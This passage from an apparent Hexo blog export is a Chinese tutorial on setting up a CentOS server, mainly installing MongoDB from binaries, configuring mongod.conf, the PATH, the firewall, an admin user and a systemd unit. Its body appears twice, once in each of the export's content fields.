id=\"Github-Nvm\"><a href=\"#Github-Nvm\" class=\"headerlink\" title=\"Github-Nvm\"></a><a href=\"https://github.com/creationix/nvm#installation\" target=\"_blank\" rel=\"noopener\">Github-Nvm</a></h3><h3 id=\"CentOS-7-使用NVM管理nodejs-Nvm安装Node-npm\"><a href=\"#CentOS-7-使用NVM管理nodejs-Nvm安装Node-npm\" class=\"headerlink\" title=\"CentOS 7 使用NVM管理nodejs + Nvm安装Node+npm\"></a><a href=\"https://blog.csdn.net/and04292/article/details/79423037\" target=\"_blank\" rel=\"noopener\">CentOS 7 使用NVM管理nodejs + Nvm安装Node+npm</a></h3><h2 id=\"安装MongoDB\"><a href=\"#安装MongoDB\" class=\"headerlink\" title=\"安装MongoDB\"></a>安装MongoDB</h2><h3 id=\"Centos下安装配置Mongodb3-6\"><a href=\"#Centos下安装配置Mongodb3-6\" class=\"headerlink\" title=\"Centos下安装配置Mongodb3.6\"></a><a href=\"https://www.cnblogs.com/hackyo/p/7967170.html\" target=\"_blank\" rel=\"noopener\">Centos下安装配置Mongodb3.6</a></h3><hr>\n<h2 id=\"二进制文件安装\"><a href=\"#二进制文件安装\" class=\"headerlink\" title=\"二进制文件安装\"></a><a href=\"https://blog.csdn.net/rzrenyu/article/details/79472508\" target=\"_blank\" rel=\"noopener\">二进制文件安装</a></h2><p><a href=\"https://blog.csdn.net/BeiiGang/article/details/43797009\" target=\"_blank\" rel=\"noopener\">二进制安装参考</a><br><a href=\"https://www.imooc.com/article/15618?block_id=tuijian_wz\" target=\"_blank\" rel=\"noopener\">参考二</a><br><a href=\"https://www.jianshu.com/p/5598f1dcbb98\" target=\"_blank\" rel=\"noopener\">参考三</a><br><a href=\"https://www.linuxidc.com/Linux/2016-07/133254.htm\" target=\"_blank\" rel=\"noopener\">参考四</a></p>\n<h3 id=\"1、下载二进制文件安装包\"><a href=\"#1、下载二进制文件安装包\" class=\"headerlink\" title=\"1、下载二进制文件安装包\"></a>1、下载二进制文件安装包</h3><blockquote>\n<p>curl -O <a href=\"https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-3.2.12.tgz\" target=\"_blank\" rel=\"noopener\">https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-3.2.12.tgz</a></p>\n</blockquote>\n<p><a href=\"https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-ubuntu1604-3.6.6.tgz\" target=\"_blank\" rel=\"noopener\">https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-ubuntu1604-3.6.6.tgz</a></p>\n<p><a href=\"http://downloads.mongodb.org/linux/mongodb-linux-x86_64-ubuntu1604-v3.6-latest.tgz\" target=\"_blank\" rel=\"noopener\">http://downloads.mongodb.org/linux/mongodb-linux-x86_64-ubuntu1604-v3.6-latest.tgz</a></p>\n<h3 id=\"2、解压\"><a href=\"#2、解压\" class=\"headerlink\" title=\"2、解压\"></a>2、解压</h3><blockquote>\n<p>tar -zxvf [mongodb-linux-x86_64-3.2.12.tgz] // [包名]</p>\n</blockquote>\n<h3 id=\"3、移动到指定位置\"><a href=\"#3、移动到指定位置\" class=\"headerlink\" title=\"3、移动到指定位置\"></a>3、移动到指定位置</h3><blockquote>\n<p>mv [mongodb-linux-x86_64-3.2.12/] /usr/local/mongodb // [解压后的文件夹]</p>\n</blockquote>\n<h3 id=\"3-1-将MongoDB的安装目录添加到Path当中-环境变量配置\"><a href=\"#3-1-将MongoDB的安装目录添加到Path当中-环境变量配置\" class=\"headerlink\" title=\"3.1 将MongoDB的安装目录添加到Path当中[环境变量配置]\"></a>3.1 将<code>MongoDB的安装目录添加到Path</code>当中[环境变量配置]</h3><p><strong>p.s</strong> 记得如果你的最后一个位置和我的不一样，请记得替换</p>\n<blockquote>\n<p>vi /etc/profile<br>增加<br>export PATH=/usr/local/mongodb/bin:$PATH<br>然后<br>source /etc/profile // BLog 有坑！ 拼写错误</p>\n</blockquote>\n<h3 id=\"4、在-usr-local-mongodb-下创建文件夹\"><a href=\"#4、在-usr-local-mongodb-下创建文件夹\" class=\"headerlink\" title=\"4、在 /usr/local/mongodb 下创建文件夹\"></a>4、在 <code>/usr/local/mongodb</code> 下创建文件夹</h3><blockquote>\n<p>mkdir -p /data/db</p>\n<p>mkdir  /logs</p>\n</blockquote>\n<h3 id=\"、创建-mongo-的数据目录\"><a href=\"#、创建-mongo-的数据目录\" class=\"headerlink\" title=\"*、创建 mongo 的数据目录\"></a>*、创建 mongo 的数据目录</h3><p>!important</p>\n<blockquote>\n<p>sudo mkdir -p /data/db    #创建数据存储目录</p>\n<p>sudo chmod 755 /data/*    #赋予目录权限</p>\n</blockquote>\n<h3 id=\"配置MongoDB\"><a href=\"#配置MongoDB\" class=\"headerlink\" title=\"配置MongoDB\"></a>配置MongoDB</h3><blockquote>\n<p>控制的配置文件在：/etc/mongodb.conf</p>\n<p>控制脚本在：/etc/init.d/mongodb</p>\n<p>MongoDB实例会把数据存放在：/var/lib/mongodb<br>日志存放在：/var/log/mongodb<br>默认由mongodb用户运行。  </p>\n</blockquote>\n<h3 id=\"5、在-usr-local-mongodb-bin下新建-分配置文件\"><a href=\"#5、在-usr-local-mongodb-bin下新建-分配置文件\" class=\"headerlink\" title=\"5、在/usr/local/mongodb/bin下新建 分配置文件\"></a>5、在/usr/local/mongodb/bin下新建 <strong>分配置文件</strong></h3><blockquote>\n<p>vim mongodb.conf<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dbpath = /usr/local/mongodb/data/db #数据文件存放目录</span><br><span class=\"line\"></span><br><span class=\"line\">logpath = /usr/local/mongodb/logs/mongodb.log #日志文件存放目录</span><br><span class=\"line\">port = 27017  #端口</span><br><span class=\"line\">fork = true  #以守护程序的方式启用，即在后台运行</span><br><span class=\"line\">nohttpinterface = true</span><br><span class=\"line\">auth=true</span><br><span class=\"line\">bind_ip=0.0.0.0</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<p>推荐第二种配置</p>\n<blockquote>\n<p>vim /etc/mongod.conf</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemLog:</span><br><span class=\"line\">  destination: file</span><br><span class=\"line\">  logAppend: true</span><br><span class=\"line\">  path: /var/log/mongodb/mongod.log</span><br><span class=\"line\"></span><br><span class=\"line\">storage:</span><br><span class=\"line\">  dbPath: /var/lib/mongo</span><br><span class=\"line\">  journal:</span><br><span class=\"line\">    enabled: true</span><br><span class=\"line\"></span><br><span class=\"line\">processManagement:</span><br><span class=\"line\">  fork: true</span><br><span class=\"line\">  pidFilePath: /var/run/mongodb/mongod.pid</span><br><span class=\"line\"></span><br><span class=\"line\">net:</span><br><span class=\"line\">  port: 21111</span><br><span class=\"line\">  bindIp: 0.0.0.0</span><br><span class=\"line\"></span><br><span class=\"line\">security:</span><br><span class=\"line\">  authorization: enabled</span><br><span class=\"line\">  javascriptEnabled: false</span><br></pre></td></tr></table></figure>\n<h3 id=\"6、环境变量配置\"><a href=\"#6、环境变量配置\" class=\"headerlink\" title=\"6、环境变量配置\"></a>6、环境变量配置</h3><blockquote>\n<p>vi /etc/profile<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export MONGODB_HOME=/usr/local/mongodb</span><br><span class=\"line\"></span><br><span class=\"line\">export PATH=$PATH:$MONGODB_HOME/bin</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<p>保存后，重启系统配置</p>\n<blockquote>\n<p>source /etc/profile</p>\n</blockquote>\n<h3 id=\"7、启动\"><a href=\"#7、启动\" class=\"headerlink\" title=\"7、启动\"></a>7、启动</h3><p>在<code>/usr/local/mongodb/bin</code>下</p>\n<blockquote>\n<p>mongod -f mongodb.conf || ./mongod -f mongodb.conf</p>\n</blockquote>\n<h3 id=\"8、关闭\"><a href=\"#8、关闭\" class=\"headerlink\" title=\"8、关闭\"></a>8、关闭</h3><blockquote>\n<p>mongod -f ./mongodb.conf –shutdown || ./mongod -f ./mongodb.conf –shutdown</p>\n</blockquote>\n<h3 id=\"9、开启端口-CentOS防火墙firewall\"><a href=\"#9、开启端口-CentOS防火墙firewall\" class=\"headerlink\" title=\"9、开启端口(CentOS防火墙firewall)\"></a>9、开启端口(CentOS防火墙firewall)</h3><blockquote>\n<p>firewall-cmd –zone=public –add-port=27017/tcp –permanent<br>查看端口</p>\n<p>firewall-cmd –permanent –query-port=27017/tcp<br>重启防火墙</p>\n<p>firewall-cmd –reload</p>\n</blockquote>\n<h3 id=\"10、创建用户管理员：\"><a href=\"#10、创建用户管理员：\" class=\"headerlink\" title=\"10、创建用户管理员：\"></a>10、创建用户管理员：</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use admin</span><br><span class=\"line\"></span><br><span class=\"line\">db.createUser(&#123;user:&quot;root&quot;,pwd:&quot;root123456&quot;,roles:[&quot;userAdminAnyDatabase&quot;]&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">db.auth(&apos;root&apos;,&apos;root123456&apos;)</span><br></pre></td></tr></table></figure>\n<h3 id=\"补充：\"><a href=\"#补充：\" class=\"headerlink\" title=\"补充：\"></a>补充：</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//mongodb中bin的文件说明</span><br><span class=\"line\">1.mongod : 执行程序</span><br><span class=\"line\">2.mongo : 用于连接客户端</span><br><span class=\"line\">3.mongoimport/mongoexport : 导入/导出</span><br><span class=\"line\">4.mongodump/mongorestore : 备份/恢复数据(二进制文件，不能被直接读取，一般用来做数据的备份)</span><br><span class=\"line\">5.mongooplog : 用来操作日志的回放</span><br><span class=\"line\">oplog : MongoDB复制集中用来记录操作记录的数据集合</span><br><span class=\"line\">6.mongostat : 用来查看mongo服务器的各种状态</span><br><span class=\"line\">scons all -j 12(编译,12是指CPU的核数)</span><br><span class=\"line\">mongod是主角，数据库执行程序</span><br><span class=\"line\">mongo 用来连接服务器的客户端</span><br><span class=\"line\">mongoimport mongoexport 导入到处</span><br><span class=\"line\">mongodump mongorestore 二进制北非回复</span><br><span class=\"line\">mongostat 查看服务器状态</span><br><span class=\"line\">mongoDB编译：进入源码目录，执行scons all进行编译。scons all -j 10 使用-j参数可以指定cpu的核数。</span><br><span class=\"line\">编译后的文件：</span><br><span class=\"line\">mongod:mongodb的启动文件，用来部署数据库</span><br><span class=\"line\">mongo：链接服务器的客户端</span><br><span class=\"line\">mongoimport,,mongoexport:用来导入导出数据库</span><br><span class=\"line\">mongodump,mongorestore:用来导入导出二进制数据，一般用来数据的备份与恢复。</span><br><span class=\"line\">mongologoplog 操作日志</span><br><span class=\"line\">mongostat:用来查看mongodb服务器的各种状态</span><br></pre></td></tr></table></figure>\n<h2 id=\"Linux-采用-systemctl-命令设置-mongodb-自启动\"><a href=\"#Linux-采用-systemctl-命令设置-mongodb-自启动\" class=\"headerlink\" title=\"Linux 采用 systemctl 命令设置 mongodb 自启动\"></a><a href=\"https://blog.csdn.net/xhzq1986/article/details/79761263\" target=\"_blank\" rel=\"noopener\">Linux 采用 <code>systemctl</code> 命令设置 <code>mongodb</code> 自启动</a></h2><p>需要学习的命令是 <a href=\"http://www.jinbuguo.com/systemd/systemd.service.html\" target=\"_blank\" rel=\"noopener\">systemctl</a><br>需要知晓的目录是 <code>/usr/lib/systemd/system</code><br>需要掌握 <code>mongodb.service</code> 的书写格式，demo如下<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[Unit]</span><br><span class=\"line\">Description=mongodb</span><br><span class=\"line\">After=network.target remote-fs.target nss-lookup.target  </span><br><span class=\"line\">  </span><br><span class=\"line\">[Service]  </span><br><span class=\"line\">Type=forking  </span><br><span class=\"line\">ExecStart=/usr/local/mongodb/bin/mongod --config /home/mongodb/mongodb/bin/mongod.conf</span><br><span class=\"line\">ExecReload=/bin/kill -s HUP $MAINPID</span><br><span class=\"line\">ExecStop=/usr/local/mongodb/bin/mongod --shutdown --config /home/mongodb/mongodb/bin/mongod.conf</span><br><span class=\"line\">PrivateTmp=true  </span><br><span class=\"line\">    </span><br><span class=\"line\">[Install]  </span><br><span class=\"line\">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure></p>\n<p>最初博主在 <code>ExecStart</code> 的写法是:  </p>\n<blockquote>\n<p>/home/mongodb/mongodb/bin/mongod –dbpath=/home/mongodb/mongodb/db –logpath=/home/mongodb/mongodb/logs/<code>date +%Y-%m-%d</code>.log –logappend –auth –fork &amp;</p>\n</blockquote>\n<p>后来参考资料改成：  </p>\n<blockquote>\n<p>/home/mongodb/mongodb/bin/mongod –config /home/mongodb/mongodb/bin/mongod.conf</p>\n</blockquote>\n<hr>\n<h2 id=\"附录：\"><a href=\"#附录：\" class=\"headerlink\" title=\"附录：\"></a><strong>附录：</strong></h2><ol>\n<li><a href=\"https://blog.csdn.net/wangjianno2/article/details/39718681\" target=\"_blank\" rel=\"noopener\">Linux下curl命令的使用</a></li>\n<li><a href=\"https://www.cnblogs.com/duhuo/p/5695256.html\" target=\"_blank\" rel=\"noopener\">Linux curl命令详解</a></li>\n<li><a href=\"https://blog.csdn.net/shuaigexiaobo/article/details/78030008\" target=\"_blank\" rel=\"noopener\">查看CentOS版本信息</a></li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"安装Nginx\"><a href=\"#安装Nginx\" class=\"headerlink\" title=\"安装Nginx\"></a>安装Nginx</h2><h3 id=\"CentOS版\"><a href=\"#CentOS版\" class=\"headerlink\" title=\"CentOS版\"></a><a href=\"\">CentOS版</a></h3><h3 id=\"Ubuntu版\"><a href=\"#Ubuntu版\" class=\"headerlink\" title=\"Ubuntu版\"></a><a href=\"\">Ubuntu版</a></h3><h2 id=\"安装Git\"><a href=\"#安装Git\" class=\"headerlink\" title=\"安装Git\"></a>安装Git</h2><h3 id=\"centos7安装最新版git\"><a href=\"#centos7安装最新版git\" class=\"headerlink\" title=\"centos7安装最新版git\"></a><a href=\"https://blog.csdn.net/zxy987872674/article/details/79220469\" target=\"_blank\" rel=\"noopener\">centos7安装最新版git</a></h3><h3 id=\"Centos7-yum-install-git2-x-较新版本\"><a href=\"#Centos7-yum-install-git2-x-较新版本\" class=\"headerlink\" title=\"Centos7 yum install git2.x(较新版本)\"></a><a href=\"https://blog.csdn.net/caimengyuan/article/details/80634752\" target=\"_blank\" rel=\"noopener\">Centos7 yum install git2.x(较新版本)</a></h3><h2 id=\"安装Nvm\"><a href=\"#安装Nvm\" class=\"headerlink\" title=\"安装Nvm\"></a>安装Nvm</h2><h3 id=\"Github-Nvm\"><a href=\"#Github-Nvm\" class=\"headerlink\" title=\"Github-Nvm\"></a><a href=\"https://github.com/creationix/nvm#installation\" target=\"_blank\" rel=\"noopener\">Github-Nvm</a></h3><h3 id=\"CentOS-7-使用NVM管理nodejs-Nvm安装Node-npm\"><a href=\"#CentOS-7-使用NVM管理nodejs-Nvm安装Node-npm\" class=\"headerlink\" title=\"CentOS 7 使用NVM管理nodejs + Nvm安装Node+npm\"></a><a href=\"https://blog.csdn.net/and04292/article/details/79423037\" target=\"_blank\" rel=\"noopener\">CentOS 7 使用NVM管理nodejs + Nvm安装Node+npm</a></h3><h2 id=\"安装MongoDB\"><a href=\"#安装MongoDB\" class=\"headerlink\" title=\"安装MongoDB\"></a>安装MongoDB</h2><h3 id=\"Centos下安装配置Mongodb3-6\"><a href=\"#Centos下安装配置Mongodb3-6\" class=\"headerlink\" title=\"Centos下安装配置Mongodb3.6\"></a><a href=\"https://www.cnblogs.com/hackyo/p/7967170.html\" target=\"_blank\" rel=\"noopener\">Centos下安装配置Mongodb3.6</a></h3><hr>\n<h2 id=\"二进制文件安装\"><a href=\"#二进制文件安装\" class=\"headerlink\" title=\"二进制文件安装\"></a><a href=\"https://blog.csdn.net/rzrenyu/article/details/79472508\" target=\"_blank\" rel=\"noopener\">二进制文件安装</a></h2><p><a href=\"https://blog.csdn.net/BeiiGang/article/details/43797009\" target=\"_blank\" rel=\"noopener\">二进制安装参考</a><br><a href=\"https://www.imooc.com/article/15618?block_id=tuijian_wz\" target=\"_blank\" rel=\"noopener\">参考二</a><br><a href=\"https://www.jianshu.com/p/5598f1dcbb98\" target=\"_blank\" rel=\"noopener\">参考三</a><br><a href=\"https://www.linuxidc.com/Linux/2016-07/133254.htm\" target=\"_blank\" rel=\"noopener\">参考四</a></p>\n<h3 id=\"1、下载二进制文件安装包\"><a href=\"#1、下载二进制文件安装包\" class=\"headerlink\" title=\"1、下载二进制文件安装包\"></a>1、下载二进制文件安装包</h3><blockquote>\n<p>curl -O <a href=\"https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-3.2.12.tgz\" target=\"_blank\" rel=\"noopener\">https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-3.2.12.tgz</a></p>\n</blockquote>\n<p><a href=\"https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-ubuntu1604-3.6.6.tgz\" target=\"_blank\" rel=\"noopener\">https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-ubuntu1604-3.6.6.tgz</a></p>\n<p><a href=\"http://downloads.mongodb.org/linux/mongodb-linux-x86_64-ubuntu1604-v3.6-latest.tgz\" target=\"_blank\" rel=\"noopener\">http://downloads.mongodb.org/linux/mongodb-linux-x86_64-ubuntu1604-v3.6-latest.tgz</a></p>\n<h3 id=\"2、解压\"><a href=\"#2、解压\" class=\"headerlink\" title=\"2、解压\"></a>2、解压</h3><blockquote>\n<p>tar -zxvf [mongodb-linux-x86_64-3.2.12.tgz] // [包名]</p>\n</blockquote>\n<h3 id=\"3、移动到指定位置\"><a href=\"#3、移动到指定位置\" class=\"headerlink\" title=\"3、移动到指定位置\"></a>3、移动到指定位置</h3><blockquote>\n<p>mv [mongodb-linux-x86_64-3.2.12/] /usr/local/mongodb // [解压后的文件夹]</p>\n</blockquote>\n<h3 id=\"3-1-将MongoDB的安装目录添加到Path当中-环境变量配置\"><a href=\"#3-1-将MongoDB的安装目录添加到Path当中-环境变量配置\" class=\"headerlink\" title=\"3.1 将MongoDB的安装目录添加到Path当中[环境变量配置]\"></a>3.1 将<code>MongoDB的安装目录添加到Path</code>当中[环境变量配置]</h3><p><strong>p.s</strong> 记得如果你的最后一个位置和我的不一样，请记得替换</p>\n<blockquote>\n<p>vi /etc/profile<br>增加<br>export PATH=/usr/local/mongodb/bin:$PATH<br>然后<br>source /etc/profile // BLog 有坑！ 拼写错误</p>\n</blockquote>\n<h3 id=\"4、在-usr-local-mongodb-下创建文件夹\"><a href=\"#4、在-usr-local-mongodb-下创建文件夹\" class=\"headerlink\" title=\"4、在 /usr/local/mongodb 下创建文件夹\"></a>4、在 <code>/usr/local/mongodb</code> 下创建文件夹</h3><blockquote>\n<p>mkdir -p /data/db</p>\n<p>mkdir  /logs</p>\n</blockquote>\n<h3 id=\"、创建-mongo-的数据目录\"><a href=\"#、创建-mongo-的数据目录\" class=\"headerlink\" title=\"*、创建 mongo 的数据目录\"></a>*、创建 mongo 的数据目录</h3><p>!important</p>\n<blockquote>\n<p>sudo mkdir -p /data/db    #创建数据存储目录</p>\n<p>sudo chmod 755 /data/*    #赋予目录权限</p>\n</blockquote>\n<h3 id=\"配置MongoDB\"><a href=\"#配置MongoDB\" class=\"headerlink\" title=\"配置MongoDB\"></a>配置MongoDB</h3><blockquote>\n<p>控制的配置文件在：/etc/mongodb.conf</p>\n<p>控制脚本在：/etc/init.d/mongodb</p>\n<p>MongoDB实例会把数据存放在：/var/lib/mongodb<br>日志存放在：/var/log/mongodb<br>默认由mongodb用户运行。  </p>\n</blockquote>\n<h3 id=\"5、在-usr-local-mongodb-bin下新建-分配置文件\"><a href=\"#5、在-usr-local-mongodb-bin下新建-分配置文件\" class=\"headerlink\" title=\"5、在/usr/local/mongodb/bin下新建 分配置文件\"></a>5、在/usr/local/mongodb/bin下新建 <strong>分配置文件</strong></h3><blockquote>\n<p>vim mongodb.conf<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dbpath = /usr/local/mongodb/data/db #数据文件存放目录</span><br><span class=\"line\"></span><br><span class=\"line\">logpath = /usr/local/mongodb/logs/mongodb.log #日志文件存放目录</span><br><span class=\"line\">port = 27017  #端口</span><br><span class=\"line\">fork = true  #以守护程序的方式启用，即在后台运行</span><br><span class=\"line\">nohttpinterface = true</span><br><span class=\"line\">auth=true</span><br><span class=\"line\">bind_ip=0.0.0.0</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<p>推荐第二种配置</p>\n<blockquote>\n<p>vim /etc/mongod.conf</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemLog:</span><br><span class=\"line\">  destination: file</span><br><span class=\"line\">  logAppend: true</span><br><span class=\"line\">  path: /var/log/mongodb/mongod.log</span><br><span class=\"line\"></span><br><span class=\"line\">storage:</span><br><span class=\"line\">  dbPath: /var/lib/mongo</span><br><span class=\"line\">  journal:</span><br><span class=\"line\">    enabled: true</span><br><span class=\"line\"></span><br><span class=\"line\">processManagement:</span><br><span class=\"line\">  fork: true</span><br><span class=\"line\">  pidFilePath: /var/run/mongodb/mongod.pid</span><br><span class=\"line\"></span><br><span class=\"line\">net:</span><br><span class=\"line\">  port: 21111</span><br><span class=\"line\">  bindIp: 0.0.0.0</span><br><span class=\"line\"></span><br><span class=\"line\">security:</span><br><span class=\"line\">  authorization: enabled</span><br><span class=\"line\">  javascriptEnabled: false</span><br></pre></td></tr></table></figure>\n<h3 id=\"6、环境变量配置\"><a href=\"#6、环境变量配置\" class=\"headerlink\" title=\"6、环境变量配置\"></a>6、环境变量配置</h3><blockquote>\n<p>vi /etc/profile<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export MONGODB_HOME=/usr/local/mongodb</span><br><span class=\"line\"></span><br><span class=\"line\">export PATH=$PATH:$MONGODB_HOME/bin</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<p>保存后，重启系统配置</p>\n<blockquote>\n<p>source /etc/profile</p>\n</blockquote>\n<h3 id=\"7、启动\"><a href=\"#7、启动\" class=\"headerlink\" title=\"7、启动\"></a>7、启动</h3><p>在<code>/usr/local/mongodb/bin</code>下</p>\n<blockquote>\n<p>mongod -f mongodb.conf || ./mongod -f mongodb.conf</p>\n</blockquote>\n<h3 id=\"8、关闭\"><a href=\"#8、关闭\" class=\"headerlink\" title=\"8、关闭\"></a>8、关闭</h3><blockquote>\n<p>mongod -f ./mongodb.conf –shutdown || ./mongod -f ./mongodb.conf –shutdown</p>\n</blockquote>\n<h3 id=\"9、开启端口-CentOS防火墙firewall\"><a href=\"#9、开启端口-CentOS防火墙firewall\" class=\"headerlink\" title=\"9、开启端口(CentOS防火墙firewall)\"></a>9、开启端口(CentOS防火墙firewall)</h3><blockquote>\n<p>firewall-cmd –zone=public –add-port=27017/tcp –permanent<br>查看端口</p>\n<p>firewall-cmd –permanent –query-port=27017/tcp<br>重启防火墙</p>\n<p>firewall-cmd –reload</p>\n</blockquote>\n<h3 id=\"10、创建用户管理员：\"><a href=\"#10、创建用户管理员：\" class=\"headerlink\" title=\"10、创建用户管理员：\"></a>10、创建用户管理员：</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use admin</span><br><span class=\"line\"></span><br><span class=\"line\">db.createUser(&#123;user:&quot;root&quot;,pwd:&quot;root123456&quot;,roles:[&quot;userAdminAnyDatabase&quot;]&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">db.auth(&apos;root&apos;,&apos;root123456&apos;)</span><br></pre></td></tr></table></figure>\n<h3 id=\"补充：\"><a href=\"#补充：\" class=\"headerlink\" title=\"补充：\"></a>补充：</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//mongodb中bin的文件说明</span><br><span class=\"line\">1.mongod : 执行程序</span><br><span class=\"line\">2.mongo : 用于连接客户端</span><br><span class=\"line\">3.mongoimport/mongoexport : 导入/导出</span><br><span class=\"line\">4.mongodump/mongorestore : 备份/恢复数据(二进制文件，不能被直接读取，一般用来做数据的备份)</span><br><span class=\"line\">5.mongooplog : 用来操作日志的回放</span><br><span class=\"line\">oplog : MongoDB复制集中用来记录操作记录的数据集合</span><br><span class=\"line\">6.mongostat : 用来查看mongo服务器的各种状态</span><br><span class=\"line\">scons all -j 12(编译,12是指CPU的核数)</span><br><span class=\"line\">mongod是主角，数据库执行程序</span><br><span class=\"line\">mongo 用来连接服务器的客户端</span><br><span class=\"line\">mongoimport mongoexport 导入到处</span><br><span class=\"line\">mongodump mongorestore 二进制北非回复</span><br><span class=\"line\">mongostat 查看服务器状态</span><br><span class=\"line\">mongoDB编译：进入源码目录，执行scons all进行编译。scons all -j 10 使用-j参数可以指定cpu的核数。</span><br><span class=\"line\">编译后的文件：</span><br><span class=\"line\">mongod:mongodb的启动文件，用来部署数据库</span><br><span class=\"line\">mongo：链接服务器的客户端</span><br><span class=\"line\">mongoimport,,mongoexport:用来导入导出数据库</span><br><span class=\"line\">mongodump,mongorestore:用来导入导出二进制数据，一般用来数据的备份与恢复。</span><br><span class=\"line\">mongologoplog 操作日志</span><br><span class=\"line\">mongostat:用来查看mongodb服务器的各种状态</span><br></pre></td></tr></table></figure>\n<h2 id=\"Linux-采用-systemctl-命令设置-mongodb-自启动\"><a href=\"#Linux-采用-systemctl-命令设置-mongodb-自启动\" class=\"headerlink\" title=\"Linux 采用 systemctl 命令设置 mongodb 自启动\"></a><a href=\"https://blog.csdn.net/xhzq1986/article/details/79761263\" target=\"_blank\" rel=\"noopener\">Linux 采用 <code>systemctl</code> 命令设置 <code>mongodb</code> 